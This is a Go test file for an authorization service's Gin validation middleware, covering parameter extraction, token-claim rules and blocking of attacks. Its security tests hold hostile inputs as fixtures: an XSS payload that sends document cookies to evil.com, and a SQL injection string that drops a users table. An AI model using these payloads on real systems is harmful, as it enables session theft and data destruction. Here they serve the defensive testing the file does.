package middleware

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/you/authzsvc/domain"
	"github.com/you/authzsvc/internal/config"
	"github.com/you/authzsvc/internal/mocks"
)

func TestGinContextAdapter(t *testing.T) {
	gin.SetMode(gin.TestMode)

	tests := []struct {
		name           string
		method         string
		url            string
		headers        map[string]string
		body           interface{}
		pathParam      map[string]string
		expectedPath   string
		expectedQuery  string
		expectedHeader string
		expectedBody   interface{}
	}{
		{
			name:           "path parameter extraction",
			method:         "GET",
			url:            "/users/123",
			pathParam:      map[string]string{"user_id": "123"},
			expectedPath:   "123",
		},
		{
			name:           "query parameter extraction",
			method:         "GET", 
			url:            "/data?tenant_id=456",
			expectedQuery:  "456",
		},
		{
			name:           "header extraction",
			method:         "GET",
			url:            "/resource",
			headers:        map[string]string{"x-user-id": "789"},
			expectedHeader: "789",
		},
		{
			name:         "body field extraction",
			method:       "POST",
			url:          "/create",
			body:         map[string]interface{}{"user_id": "999", "tenant_id": "888"},
			expectedBody: "999",
		},
		{
			name:         "nested body field extraction",
			method:       "POST",
			url:          "/create",
			body:         map[string]interface{}{"user": map[string]interface{}{"id": "777"}},
			expectedBody: "777",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Setup request
			var reqBody *bytes.Buffer
			if tt.body != nil {
				bodyBytes, _ := json.Marshal(tt.body)
				reqBody = bytes.NewBuffer(bodyBytes)
			} else {
				reqBody = bytes.NewBuffer([]byte{})
			}

			req := httptest.NewRequest(tt.method, tt.url, reqBody)
			if tt.headers != nil {
				for k, v := range tt.headers {
					req.Header.Set(k, v)
				}
			}

			// Setup Gin context
			w := httptest.NewRecorder()
			ctx, _ := gin.CreateTestContext(w)
			ctx.Request = req

			// Set path parameters
			for k, v := range tt.pathParam {
				ctx.Params = append(ctx.Params, gin.Param{Key: k, Value: v})
			}

			// Create adapter
			adapter, err := NewGinContextAdapter(ctx)
			if err != nil {
				t.Fatalf("failed to create adapter: %v", err)
			}

			// Test path parameter
			if tt.expectedPath != "" {
				result := adapter.GetPathParam("user_id")
				if result != tt.expectedPath {
					t.Errorf("expected path param %q, got %q", tt.expectedPath, result)
				}
			}

			// Test query parameter
			if tt.expectedQuery != "" {
				result := adapter.GetQueryParam("tenant_id")
				if result != tt.expectedQuery {
					t.Errorf("expected query param %q, got %q", tt.expectedQuery, result)
				}
			}

			// Test header
			if tt.expectedHeader != "" {
				result := adapter.GetHeader("x-user-id")
				if result != tt.expectedHeader {
					t.Errorf("expected header %q, got %q", tt.expectedHeader, result)
				}
			}

			// Test body field
			if tt.expectedBody != nil {
				result, err := adapter.GetBodyField("user_id")
				if err != nil {
					// Try nested field for nested test case
					if strings.Contains(tt.name, "nested") {
						result, err = adapter.GetBodyField("user.id")
						if err != nil {
							t.Fatalf("failed to get nested body field: %v", err)
						}
					} else {
						t.Fatalf("failed to get body field: %v", err)
					}
				}
				if result != tt.expectedBody {
					t.Errorf("expected body field %v, got %v", tt.expectedBody, result)
				}
			}
		})
	}
}

func TestValidationEngine(t *testing.T) {
	gin.SetMode(gin.TestMode)

	rules := []config.ValidationRule{
		{
			Name:        "UserIDMatch",
			Method:      "GET",
			Path:        "/users/:user_id",
			Description: "User ID in path must match token",
			Logic:       "all",
			Enabled:     true,
			Conditions: []config.ValidationCondition{
				{
					RequestField: config.FieldSource{Source: "path", Name: "user_id"},
					TokenField:   config.FieldSource{Source: "token", Name: "user_id"},
					Operator:     "equals",
				},
			},
		},
		{
			Name:        "TenantCheck",
			Method:      "POST",
			Path:        "/projects",
			Description: "Tenant must match",
			Logic:       "all",
			Enabled:     true,
			Conditions: []config.ValidationCondition{
				{
					RequestField: config.FieldSource{Source: "body", Name: "tenant_id"},
					TokenField:   config.FieldSource{Source: "token", Name: "tenant_id"},
					Operator:     "equals",
				},
			},
		},
	}

	engine := NewValidationEngine(rules)

	tests := []struct {
		name         string
		method       string
		path         string
		url          string
		pathParams   map[string]string
		body         interface{}
		tokenClaims  map[string]interface{}
		expectValid  bool
		expectError  string
	}{
		{
			name:        "valid user ID match",
			method:      "GET",
			path:        "/users/:user_id",
			url:         "/users/123",
			pathParams:  map[string]string{"user_id": "123"},
			tokenClaims: map[string]interface{}{"user_id": "123"},
			expectValid: true,
		},
		{
			name:        "invalid user ID match",
			method:      "GET", 
			path:        "/users/:user_id",
			url:         "/users/123",
			pathParams:  map[string]string{"user_id": "123"},
			tokenClaims: map[string]interface{}{"user_id": "456"},
			expectValid: false,
		},
		{
			name:        "valid tenant check",
			method:      "POST",
			path:        "/projects",
			url:         "/projects",
			body:        map[string]interface{}{"tenant_id": "tenant-1", "name": "Project"},
			tokenClaims: map[string]interface{}{"user_id": "123", "tenant_id": "tenant-1"},
			expectValid: true,
		},
		{
			name:        "invalid tenant check",
			method:      "POST",
			path:        "/projects", 
			url:         "/projects",
			body:        map[string]interface{}{"tenant_id": "tenant-1", "name": "Project"},
			tokenClaims: map[string]interface{}{"user_id": "123", "tenant_id": "tenant-2"},
			expectValid: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Setup request
			var reqBody *bytes.Buffer
			if tt.body != nil {
				bodyBytes, _ := json.Marshal(tt.body)
				reqBody = bytes.NewBuffer(bodyBytes)
			} else {
				reqBody = bytes.NewBuffer([]byte{})
			}

			req := httptest.NewRequest(tt.method, tt.url, reqBody)
			w := httptest.NewRecorder()
			ctx, _ := gin.CreateTestContext(w)
			ctx.Request = req

			// Set path parameters
			for k, v := range tt.pathParams {
				ctx.Params = append(ctx.Params, gin.Param{Key: k, Value: v})
			}

			// Mock FullPath to return the route pattern
			ctx.Set("fullPath", tt.path)
			// Override FullPath method (this is a simplified mock)
			originalFullPath := ctx.FullPath()
			if tt.path != "" {
				// In a real test, you'd set up the router properly
				// For this test, we'll directly set the expected path
			}

			err := engine.ValidateRequest(ctx, tt.tokenClaims)
			
			if tt.expectValid && err != nil {
				t.Errorf("expected validation to pass, got error: %v", err)
			}
			
			if !tt.expectValid && err == nil {
				t.Errorf("expected validation to fail, but it passed")
			}

			if tt.expectError != "" && (err == nil || !strings.Contains(err.Error(), tt.expectError)) {
				t.Errorf("expected error containing %q, got: %v", tt.expectError, err)
			}

			// Restore original path if modified
			_ = originalFullPath
		})
	}
}

func TestValidationCondition_CompareValues(t *testing.T) {
	tests := []struct {
		name      string
		operator  string
		reqValue  interface{}
		tokenValue interface{}
		expected  bool
		expectErr bool
	}{
		{
			name:       "equals string match",
			operator:   "equals",
			reqValue:   "123",
			tokenValue: "123",
			expected:   true,
		},
		{
			name:       "equals string no match",
			operator:   "equals",
			reqValue:   "123",
			tokenValue: "456",
			expected:   false,
		},
		{
			name:       "in array match",
			operator:   "in",
			reqValue:   "project-1",
			tokenValue: []interface{}{"project-1", "project-2"},
			expected:   true,
		},
		{
			name:       "in array no match",
			operator:   "in",
			reqValue:   "project-3",
			tokenValue: []interface{}{"project-1", "project-2"},
			expected:   false,
		},
		{
			name:       "contains match",
			operator:   "contains",
			reqValue:   "hello world",
			tokenValue: "world",
			expected:   true,
		},
		{
			name:       "exists check true",
			operator:   "exists",
			reqValue:   "some-value",
			tokenValue: nil,
			expected:   true,
		},
		{
			name:       "exists check false",
			operator:   "exists",
			reqValue:   "",
			tokenValue: nil,
			expected:   false,
		},
		{
			name:      "unknown operator",
			operator:  "unknown",
			reqValue:  "value",
			tokenValue: "value",
			expected:  false,
			expectErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			condition := config.ValidationCondition{
				Operator: tt.operator,
			}

			result, err := condition.CompareValues(tt.reqValue, tt.tokenValue)

			if tt.expectErr {
				if err == nil {
					t.Errorf("expected error, got nil")
				}
				return
			}

			if err != nil {
				t.Errorf("unexpected error: %v", err)
				return
			}

			if result != tt.expected {
				t.Errorf("expected %v, got %v", tt.expected, result)
			}
		})
	}
}

// TestValidationMiddleware_Integration tests the complete validation middleware pipeline
func TestValidationMiddleware_Integration(t *testing.T) {
	gin.SetMode(gin.TestMode)

	tests := []struct {
		name               string
		endpoint           string
		method             string
		requestBody        interface{}
		headers            map[string]string
		setupMocks         func(*mocks.MockRequestValidationService)
		expectedStatusCode int
		expectedResponse   string
		validateResponse   func(t *testing.T, recorder *httptest.ResponseRecorder)
	}{
		{
			name:     "successful validation - request passes all checks",
			endpoint: "/auth/register",
			method:   "POST",
			requestBody: map[string]interface{}{
				"email":    "test@example.com",
				"password": "SecurePassword123!",
				"phone":    "+1234567890",
				"role":     "user",
			},
			headers: map[string]string{
				"Content-Type": "application/json",
				"User-Agent":   "Mozilla/5.0",
			},
			setupMocks: func(validationSvc *mocks.MockRequestValidationService) {
				validationSvc.ValidateRegistrationRequestFunc = func(ctx context.Context, email, phone, password, role string, validationCtx *domain.ValidationContext) (*domain.ValidationResult, error) {
					return &domain.ValidationResult{
						IsValid:        true,
						Passed:         true,
						Errors:         []domain.ValidationError{},
						Warnings:       []domain.ValidationError{},
						ValidationTime: 50 * time.Millisecond,
						RulesApplied:   3,
						ValidationID:   "reg_val_123",
						Timestamp:      time.Now(),
					}, nil
				}
			},
			expectedStatusCode: http.StatusOK,
			validateResponse: func(t *testing.T, recorder *httptest.ResponseRecorder) {
				t.Helper()
				// Should pass through to next handler
				if recorder.Code != http.StatusOK {
					t.Errorf("expected status 200, got %d", recorder.Code)
				}
			},
		},
		{
			name:     "validation failure - rate limit exceeded",
			endpoint: "/auth/login",
			method:   "POST",
			requestBody: map[string]interface{}{
				"email":    "user@example.com",
				"password": "password123",
			},
			headers: map[string]string{
				"Content-Type": "application/json",
				"X-Forwarded-For": "192.168.1.100",
			},
			setupMocks: func(validationSvc *mocks.MockRequestValidationService) {
				validationSvc.ValidateLoginRequestFunc = func(ctx context.Context, email, password string, validationCtx *domain.ValidationContext) (*domain.ValidationResult, error) {
					return &domain.ValidationResult{
						IsValid: false,
						Passed:  false,
						Errors: []domain.ValidationError{
							{
								Code:      "RATE_LIMIT_EXCEEDED",
								Message:   "Login rate limit exceeded",
								Severity:  domain.SeverityError,
								Category:  domain.CategoryRateLimit,
								Timestamp: time.Now(),
							},
						},
						ValidationTime: 10 * time.Millisecond,
						ValidationID:   "login_val_124",
					}, nil
				}
			},
			expectedStatusCode: http.StatusTooManyRequests,
			validateResponse: func(t *testing.T, recorder *httptest.ResponseRecorder) {
				t.Helper()
				var response map[string]interface{}
				if err := json.Unmarshal(recorder.Body.Bytes(), &response); err != nil {
					t.Errorf("failed to unmarshal response: %v", err)
					return
				}
				if response["error"] == nil {
					t.Error("expected error field in response")
					return
				}
				errorStr, ok := response["error"].(string)
				if !ok {
					t.Errorf("expected error to be string, got %T", response["error"])
					return
				}
				if !strings.Contains(errorStr, "rate limit") {
					t.Error("expected rate limit error message")
				}
			},
		},
		{
			name:     "validation failure - security threat detected",
			endpoint: "/api/comments",
			method:   "POST",
			requestBody: map[string]interface{}{
				"content": "<script>alert('xss')</script>",
			},
			headers: map[string]string{
				"Content-Type": "application/json",
			},
			setupMocks: func(validationSvc *mocks.MockRequestValidationService) {
				validationSvc.ValidateRequestFunc = func(ctx context.Context, request interface{}, validationCtx *domain.ValidationContext) (*domain.ValidationResult, error) {
					return &domain.ValidationResult{
						IsValid: false,
						Passed:  false,
						Errors: []domain.ValidationError{
							{
								Code:      "SECURITY_THREAT",
								Field:     "content",
								Message:   "Security threat: XSS script injection detected",
								Severity:  domain.SeverityCritical,
								Category:  domain.CategorySecurity,
								Timestamp: time.Now(),
							},
						},
						SecurityResult: &domain.SecurityValidationResult{
							ThreatLevel: domain.ThreatCritical,
							ThreatTypes: []domain.ThreatType{domain.ThreatXSS},
							Violations: []domain.SecurityViolation{
								{
									Type:        domain.ThreatXSS,
									Severity:    domain.SeverityCritical,
									Description: "XSS script injection detected",
									FieldName:   "content",
									Pattern:     "<script>",
									Action:      domain.ActionBlock,
									Blocked:     true,
								},
							},
						},
						ValidationTime: 25 * time.Millisecond,
						ValidationID:   "sec_val_125",
					}, nil
				}
			},
			expectedStatusCode: http.StatusForbidden,
			validateResponse: func(t *testing.T, recorder *httptest.ResponseRecorder) {
				t.Helper()
				var response map[string]interface{}
				if err := json.Unmarshal(recorder.Body.Bytes(), &response); err != nil {
					t.Errorf("failed to unmarshal response: %v", err)
					return
				}
				if response["error"] == nil {
					t.Error("expected error field in response")
					return
				}
				errorStr, ok := response["error"].(string)
				if !ok {
					t.Errorf("expected error to be string, got %T", response["error"])
					return
				}
				if !strings.Contains(strings.ToLower(errorStr), "security") {
					t.Error("expected security error message")
				}
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create mock validation service
			validationSvc := mocks.NewMockRequestValidationService()
			tt.setupMocks(validationSvc)

			// Create middleware with minimal configuration
			middleware := createTestValidationMiddleware(validationSvc)

			// Setup router
			router := gin.New()
			router.Use(middleware)
			
			// Add a test handler that returns 200 OK if validation passes
			router.Any("/*path", func(c *gin.Context) {
				c.JSON(http.StatusOK, gin.H{"message": "success"})
			})

			// Create request
			var reqBody *bytes.Buffer
			if str, ok := tt.requestBody.(string); ok {
				reqBody = bytes.NewBufferString(str)
			} else if tt.requestBody != nil {
				bodyBytes, _ := json.Marshal(tt.requestBody)
				reqBody = bytes.NewBuffer(bodyBytes)
			} else {
				reqBody = bytes.NewBuffer([]byte{})
			}

			req := httptest.NewRequest(tt.method, tt.endpoint, reqBody)
			
			// Set headers
			for key, value := range tt.headers {
				req.Header.Set(key, value)
			}

			// Execute request
			recorder := httptest.NewRecorder()
			router.ServeHTTP(recorder, req)

			// Validate status code
			if recorder.Code != tt.expectedStatusCode {
				t.Errorf("expected status code %d, got %d", tt.expectedStatusCode, recorder.Code)
			}

			// Run custom validation
			tt.validateResponse(t, recorder)
		})
	}
}

// TestValidationMiddleware_SecurityScenarios tests specific security attack scenarios
func TestValidationMiddleware_SecurityScenarios(t *testing.T) {
	gin.SetMode(gin.TestMode)

	tests := []struct {
		name           string
		attackType     string
		requestBody    interface{}
		headers        map[string]string
		setupMocks     func(*mocks.MockRequestValidationService)
		expectedStatus int
		validateThreat func(t *testing.T, recorder *httptest.ResponseRecorder)
	}{
		{
			name:       "XSS attack in comment field",
			attackType: "xss",
			requestBody: map[string]interface{}{
				"comment": "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
			},
			setupMocks: func(validationSvc *mocks.MockRequestValidationService) {
				validationSvc.ValidateRequestFunc = func(ctx context.Context, request interface{}, validationCtx *domain.ValidationContext) (*domain.ValidationResult, error) {
					return &domain.ValidationResult{
						IsValid: false,
						Passed:  false,
						SecurityResult: &domain.SecurityValidationResult{
							ThreatLevel: domain.ThreatHigh,
							ThreatTypes: []domain.ThreatType{domain.ThreatXSS},
							Violations: []domain.SecurityViolation{
								{
									Type:        domain.ThreatXSS,
									Severity:    domain.SeverityCritical,
									Description: "XSS script injection detected",
									FieldName:   "comment",
									Pattern:     "<script>",
									Action:      domain.ActionBlock,
									Blocked:     true,
									RiskScore:   0.95,
									Confidence:  0.98,
								},
							},
						},
						Errors: []domain.ValidationError{
							{
								Code:      "SECURITY_THREAT",
								Message:   "XSS attack detected",
								Severity:  domain.SeverityCritical,
								Category:  domain.CategorySecurity,
								Timestamp: time.Now(),
							},
						},
					}, nil
				}
			},
			expectedStatus: http.StatusForbidden,
			validateThreat: func(t *testing.T, recorder *httptest.ResponseRecorder) {
				t.Helper()
				// Check security headers
				if recorder.Header().Get("X-Content-Type-Options") == "" {
					t.Error("expected X-Content-Type-Options header")
				}
				
				var response map[string]interface{}
				if err := json.Unmarshal(recorder.Body.Bytes(), &response); err != nil {
					t.Errorf("failed to unmarshal response: %v", err)
					return
				}
				
				// Check threat_level in details section
				details, ok := response["details"].(map[string]interface{})
				if !ok {
					t.Error("expected details in response")
					return
				}
				
				if details["threat_level"] == nil {
					t.Error("expected threat_level in response details")
				}
			},
		},
		{
			name:       "SQL injection in search parameter",
			attackType: "sql_injection",
			requestBody: map[string]interface{}{
				"search": "'; DROP TABLE users; --",
			},
			setupMocks: func(validationSvc *mocks.MockRequestValidationService) {
				validationSvc.ValidateRequestFunc = func(ctx context.Context, request interface{}, validationCtx *domain.ValidationContext) (*domain.ValidationResult, error) {
					return &domain.ValidationResult{
						IsValid: false,
						Passed:  false,
						SecurityResult: &domain.SecurityValidationResult{
							ThreatLevel: domain.ThreatCritical,
							ThreatTypes: []domain.ThreatType{domain.ThreatSQLInjection},
							Violations: []domain.SecurityViolation{
								{
									Type:        domain.ThreatSQLInjection,
									Severity:    domain.SeverityCritical,
									Description: "SQL injection attempt detected",
									FieldName:   "search",
									Pattern:     "DROP TABLE",
									Action:      domain.ActionBlock,
									Blocked:     true,
									RiskScore:   0.99,
									Confidence:  0.97,
								},
							},
						},
						Errors: []domain.ValidationError{
							{
								Code:      "SECURITY_THREAT",
								Message:   "SQL injection attempt detected",
								Severity:  domain.SeverityCritical,
								Category:  domain.CategorySecurity,
								Timestamp: time.Now(),
							},
						},
					}, nil
				}
			},
			expectedStatus: http.StatusForbidden,
			validateThreat: func(t *testing.T, recorder *httptest.ResponseRecorder) {
				t.Helper()
				var response map[string]interface{}
				if err := json.Unmarshal(recorder.Body.Bytes(), &response); err != nil {
					t.Errorf("failed to unmarshal response: %v", err)
					return
				}
				
				// Check security_violations in details section
				details, ok := response["details"].(map[string]interface{})
				if !ok {
					t.Error("expected details in response")
					return
				}
				
				if details["security_violations"] == nil {
					t.Error("expected security_violations in response details")
				}
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create mock validation service
			validationSvc := mocks.NewMockRequestValidationService()
			tt.setupMocks(validationSvc)

			// Create middleware with minimal configuration
			middleware := createTestValidationMiddleware(validationSvc)

			// Setup router
			router := gin.New()
			router.Use(middleware)
			router.POST("/test", func(c *gin.Context) {
				c.JSON(http.StatusOK, gin.H{"message": "success"})
			})

			// Create request
			bodyBytes, _ := json.Marshal(tt.requestBody)
			req := httptest.NewRequest("POST", "/test", bytes.NewBuffer(bodyBytes))
			req.Header.Set("Content-Type", "application/json")
			
			// Set additional headers
			for key, value := range tt.headers {
				req.Header.Set(key, value)
			}

			// Execute request
			recorder := httptest.NewRecorder()
			router.ServeHTTP(recorder, req)

			// Validate status
			if recorder.Code != tt.expectedStatus {
				t.Errorf("expected status %d, got %d", tt.expectedStatus, recorder.Code)
			}

			// Run custom threat validation
			tt.validateThreat(t, recorder)
		})
	}
}

// Helper function to create a test validation middleware with minimal configuration
func createTestValidationMiddleware(requestValidator *mocks.MockRequestValidationService) gin.HandlerFunc {
	// Create mock services for other dependencies
	securityValidator := mocks.NewMockSecurityValidationService()
	businessValidator := mocks.NewMockBusinessValidationService()
	rateLimitValidator := mocks.NewMockRateLimitValidationService()
	
	// Create minimal config
	config := ValidationConfig{
		EnableSecurityValidation: true,
		EnableBusinessValidation: true,
		EnableRateLimiting:      true,
		MaxRequestSize:          1024 * 1024, // 1MB
		ValidationTimeout:       5 * time.Second,
		LogValidationEvents:     false,
		EnableMetrics:          false,
	}
	
	// Create middleware
	middleware := NewValidationMiddleware(
		requestValidator,
		securityValidator,
		businessValidator,
		rateLimitValidator,
		nil, // No metrics collector for testing
		nil, // No logger for testing
		config,
	)
	
	return middleware.ValidateRequest()
}